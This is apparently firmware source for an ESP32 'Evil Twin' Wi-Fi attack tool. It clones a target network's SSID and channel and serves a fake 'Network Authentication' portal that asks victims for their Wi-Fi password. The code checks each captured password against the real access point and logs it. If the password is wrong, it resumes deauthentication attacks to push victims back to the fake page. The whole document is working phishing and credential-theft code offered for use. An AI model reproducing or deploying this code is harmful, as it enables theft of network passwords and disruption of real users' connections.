String generateFakePage() {
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
                  "<title>Network Authentication</title>"
                  "<style>"
                  "* { margin: 0; padding: 0; box-sizing: border-box; }"
                  "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }"
                  ".container { background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 420px; width: 100%; overflow: hidden; }"
                  ".header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px 20px; text-align: center; }"
                  ".header h1 { font-size: 24px; margin-bottom: 5px; }"
                  ".header p { font-size: 13px; opacity: 0.9; }"
                  ".logo { width: 50px; height: 50px; background: rgba(255,255,255,0.2); border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 28px; }"
                  ".content { padding: 30px 25px; }"
                  ".info-box { background: #f8f9fa; border-left: 4px solid #667eea; padding: 15px; border-radius: 6px; margin-bottom: 20px; font-size: 13px; color: #333; }"
                  ".info-box strong { color: #667eea; }"
                  ".network-info { background: #f0f2ff; padding: 12px 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; }"
                  ".network-info .label { font-size: 11px; color: #666; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 5px; }"
                  ".network-info .ssid { font-size: 18px; font-weight: 600; color: #667eea; }"
                  ".form-group { margin-bottom: 15px; }"
                  ".form-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 8px; }"
                  ".form-group input { width: 100%; padding: 12px 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; transition: border-color 0.2s; }"
                  ".form-group input:focus { outline: none; border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.1); }"
                  ".form-group input::placeholder { color: #999; }"
                  ".submit-btn { width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; transition: transform 0.2s; }"
                  ".submit-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(102,126,234,0.4); }"
                  ".submit-btn:active { transform: translateY(0); }"
                  ".footer { padding: 15px 25px; background: #f8f9fa; font-size: 11px; color: #999; text-align: center; border-top: 1px solid #eee; }"
                  ".warning { font-size: 12px; color: #d9534f; margin-top: 10px; }"
                  "</style></head><body>"
                  "<div class='container'>"
                  "<div class='header'>"
                  "<div class='logo'>🔒</div>"
                  "<h1>Network Authentication</h1>"
                  "<p>Secure Connection Required</p>"
                  "</div>"
                  "<div class='content'>"
                  "<div class='network-info'>"
                  "<div class='label'>Connected Network</div>"
                  "<div class='ssid'>" + evilTarget.ssid + "</div>"
                  "</div>"
                  "<div class='info-box'>"
                  "<strong>Important:</strong> To access this network and verify your device, please enter your network password below. This helps us ensure network security and prevent unauthorized access."
                  "</div>"
                  "<form method='post' action='/verify'>"
                  "<div class='form-group'>"
                  "<label for='password'>Network Password</label>"
                  "<input type='password' id='password' name='password' placeholder='Enter WiFi password' required autofocus>"
                  "</div>"
                  "<button type='submit' class='submit-btn'>Verify & Connect</button>"
                  "<div class='warning'>⚠️ Your connection will be established after verification</div>"
                  "</form>"
                  "</div>"
                  "<div class='footer'>"
                  "Network Security Protocol v1.2 | All data encrypted | Do not share this page"
                  "</div>"
                  "</div></body></html>";
    return html;
}
void handleWebRoot() {

    if (hotspot_active && webServer.method() == HTTP_POST && webServer.hasArg("password")) {
        _tryPassword = webServer.arg("password");
        
        // Try to connect to the real AP to verify the password
        WiFi.disconnect();
        delay(100);
        WiFi.begin(evilTarget.ssid.c_str(), _tryPassword.c_str(), evilTarget.ch, evilTarget.bssid);
        
        // Wait for connection result (with timeout)
        unsigned long startAttempt = millis();
        bool connectionSuccess = false;
        
        // Wait up to 10 seconds for connection
        while (millis() - startAttempt < 10000) {
            if (WiFi.status() == WL_CONNECTED) {
                connectionSuccess = true;
                break;
            }
            delay(100);
            webServer.handleClient(); // Keep web server responsive
        }
        
        // Log the password with the result
        savePasswordLog(evilTarget.ssid, bytesToStr(evilTarget.bssid, 6), _tryPassword, connectionSuccess);
        
        // Show result page
        String html;
        if (connectionSuccess) {
            html = "<html><body><h2 style='color:green'>Password Verified!</h2>"
                   "<p>Redirecting to internet...</p>"
                   "<script>setTimeout(function(){window.location.href='http://captive.apple.com';},3000);</script>"
                   "</body></html>";
            Serial.println("CORRECT PASSWORD: " + _tryPassword);
            stopEvilTwin();
        } else {
            html = "<html><head><meta http-equiv='refresh' content='3;url=/'></head>"
                   "<body><h2 style='color:red'>Wrong Password</h2><p>Please try again.</p></body></html>";
            Serial.println("WRONG PASSWORD: " + _tryPassword);
        }
        
        webServer.send(200, "text/html", html);
        return;
    } 

    if (hotspot_active) {
        webServer.send(200, "text/html", generateFakePage());
        return;
    }


    String uri = webServer.uri();
    if (uri == "/" || uri == "/admin" || uri == "/index.html") {
        webServer.send(200, "text/html", ADMIN_HTML);
        return;
    }

    // All other requests redirect to admin root
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/", true);
    webServer.send(302, "text/plain", "Redirecting to NETCIPHER Control Panel...");
}
void handleNotFound() {
    // If Evil-Twin is active, serve the fake login page for all requests
    if (hotspot_active) {
        webServer.send(200, "text/html", generateFakePage());
        return;
    }
    
    // Otherwise redirect to admin panel
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/", true);
    webServer.send(302, "text/plain", "Redirecting...");
}
void handleResult() {
    // This page is kept for backwards compatibility
    // The actual verification happens in handleWebRoot()
    String html;
    if (WiFi.status() == WL_CONNECTED) {
        html = "<html><body><h2 style='color:green'>Password Verified!</h2>"
               "<p>Redirecting...</p>"
               "<script>window.location.href='http://captive.apple.com';</script>"
               "</body></html>";
    } else {
        html = "<html><head><meta http-equiv='refresh' content='1;url=/'></head>"
               "<body><h2>Loading...</h2></body></html>";
    }
    webServer.send(200, "text/html", html);
}
void startEvilTwin() {
    lastActivityTime = millis();
    // Find the first selected AP with a non-empty SSID
    bool found = false;
    for (int i = 0; i < MAX_TARGETS; i++) {
        if (_networks[i].selected && _networks[i].ssid.length() > 0) {
            evilTarget = _networks[i];
            found = true;
            break;
        }
    }
    if (!found) {
        Serial.println("No target selected for Evil-Twin");
        return;
    }

    // Stop any running attacks
    if (combinedDeauthActive) combinedDeauthActive = false;
    if (flood_active) flood_active = false;
    if (deauthAllActive) deauthAllActive = false;
    if (beaconSpam.running) beaconSpam.stop();
    if (deauthMonitorActive) stopDeauthMonitor();
    if (isScanningStations) stopStationScan();
    if (hiddenRecoveryActive) stopHiddenRecovery();

    // Change the SoftAP SSID to the target's SSID
    WiFi.disconnect(true);          // clear any previous STA connection
    WiFi.mode(WIFI_AP_STA);         // enable both AP and STA
    WiFi.softAPdisconnect(true);
    delay(100);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
    WiFi.softAP(evilTarget.ssid.c_str());
    // --- ADD THIS ---
    // Force AP to use the same channel as the real target AP
    wifi_config_t conf;
    esp_wifi_get_config(WIFI_IF_AP, &conf);
    conf.ap.channel = evilTarget.ch;
    esp_wifi_set_config(WIFI_IF_AP, &conf);
    esp_wifi_set_channel(evilTarget.ch, WIFI_SECOND_CHAN_NONE);
    delay(100);

    hotspot_active = true;
    Serial.println("Evil-Twin started with SSID: " + evilTarget.ssid);
}

// Stop Evil-Twin mode and restore the admin AP
void stopEvilTwin() {
    if (!hotspot_active) return;

    WiFi.softAPdisconnect(true);
    delay(100);
    startAccessPoint();

    hotspot_active = false;
    if (apDeauthActive) {
        apDeauthActive = false;
        deauthing_active = false;
        attack_running = false;
        combinedDeauthActive = false;
        digitalWrite(LED_PIN, LOW);
        Serial.println("AP Deauth stopped due to Evil-Twin stop");
    }
    
    Serial.println("Evil-Twin stopped");
}
void handleVerifyPage() {
    // Capture password if this is a POST request
    if (webServer.method() == HTTP_POST && webServer.hasArg("password")) {
        _tryPassword = webServer.arg("password");
        verificationStartTime = millis();
        apDeauthActive = stationDeauthActive = combinedDeauthActive = flood_active = deauthAllActive = false;
        
        // --- START THE ACTUAL CONNECTION TO THE REAL AP ---
        WiFi.disconnect(true);
        delay(100);
        WiFi.begin(evilTarget.ssid.c_str(), _tryPassword.c_str(), evilTarget.ch, evilTarget.bssid);
        // -------------------------------------------------
    }
    
    // Show the "Verifying Connection" page (unchanged)
    String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta http-equiv='refresh' content='2;url=/check_status'><meta name='viewport' content='width=device-width, initial-scale=1'>"
                  "<title>Connecting...</title>"
                  "<style>"
                  "* { margin: 0; padding: 0; box-sizing: border-box; }"
                  "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }"
                  ".container { background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 400px; width: 100%; text-align: center; padding: 40px 30px; }"
                  ".spinner { width: 50px; height: 50px; border: 4px solid #f0f0f0; border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }"
                  "@keyframes spin { to { transform: rotate(360deg); } }"
                  "h2 { color: #333; font-size: 22px; margin-bottom: 10px; }"
                  ".subtitle { color: #666; font-size: 14px; }"
                  ".status { color: #667eea; font-weight: 600; margin-top: 15px; font-size: 13px; }"
                  "</style></head><body>"
                  "<div class='container'>"
                  "<div class='spinner'></div>"
                  "<h2>Verifying Connection</h2>"
                  "<p class='subtitle'>Please wait while we authenticate your credentials...</p>"
                  "<p class='status'>Do not close this window</p>"
                  "</div></body></html>";
    webServer.send(200, "text/html", html);
}
void handleCheckStatus() {
    if (WiFi.status() == WL_CONNECTED) {
        savePasswordLog(evilTarget.ssid, bytesToStr(evilTarget.bssid, 6), _tryPassword, true);
        stopEvilTwin();
        String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
                      "<title>Connection Successful</title>"
                      "<style>"
                      "* { margin: 0; padding: 0; box-sizing: border-box; }"
                      "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }"
                      ".container { background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 400px; width: 100%; text-align: center; padding: 40px 30px; }"
                      ".checkmark { width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 48px; color: white; animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }"
                      "@keyframes popIn { 0% { transform: scale(0); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }"
                      "h2 { color: #11998e; font-size: 24px; margin-bottom: 10px; }"
                      ".subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }"
                      ".info { background: #f0fdf4; border-left: 4px solid #38ef7d; padding: 12px 15px; border-radius: 6px; font-size: 13px; color: #333; margin-bottom: 15px; text-align: left; }"
                      ".redirect { color: #999; font-size: 12px; margin-top: 15px; }"
                      "</style></head><body>"
                      "<div class='container'>"
                      "<div class='checkmark'>✓</div>"
                      "<h2>Connected Successfully!</h2>"
                      "<p class='subtitle'>Your device has been authenticated</p>"
                      "<div class='info'>You now have full network access. Enjoy your connection!</div>"
                      "<p class='redirect'>Redirecting to internet in 2 seconds...</p>"
                      "<script>setTimeout(function(){window.location.href='http://captive.apple.com';},2000);</script>"
                      "</div></body></html>";
        webServer.send(200, "text/html", html);
    }
    else if (millis() - verificationStartTime > 10000) {
        savePasswordLog(evilTarget.ssid, bytesToStr(evilTarget.bssid, 6), _tryPassword, false);
        // ADD THIS LINE - Resume deauth (restore from saved state or just restart)
        if (hasSelectedTargets()) apDeauthActive = true;
        if (getSelectedStationCount() > 0) stationDeauthActive = true;
        String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1'>"
                      "<title>Connection Failed</title>"
                      "<style>"
                      "* { margin: 0; padding: 0; box-sizing: border-box; }"
                      "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }"
                      ".container { background: white; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); max-width: 400px; width: 100%; text-align: center; padding: 40px 30px; }"
                      ".xmark { width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #eb3349 0%, #f45c43 100%); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 48px; color: white; animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }"
                      "@keyframes popIn { 0% { transform: scale(0); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }"
                      "h2 { color: #eb3349; font-size: 24px; margin-bottom: 10px; }"
                      ".subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }"
                      ".error-box { background: #fef2f2; border-left: 4px solid #f45c43; padding: 12px 15px; border-radius: 6px; font-size: 13px; color: #333; margin-bottom: 15px; text-align: left; }"
                      ".retry { color: #999; font-size: 12px; margin-top: 15px; }"
                      "</style></head><body>"
                      "<div class='container'>"
                      "<div class='xmark'>✕</div>"
                      "<h2>Authentication Failed</h2>"
                      "<p class='subtitle'>Unable to verify your credentials</p>"
                      "<div class='error-box'>The password you entered appears to be incorrect. Please check and try again.</div>"
                      "<p class='retry'>Redirecting in 2 seconds...</p>"
                      "<script>setTimeout(function(){window.location.href='/';},2000);</script>"
                      "</div></body></html>";
        webServer.send(200, "text/html", html);
    }
    else {
        webServer.sendHeader("Location", "/verify", true);
        webServer.send(302, "text/plain", "");
    }
}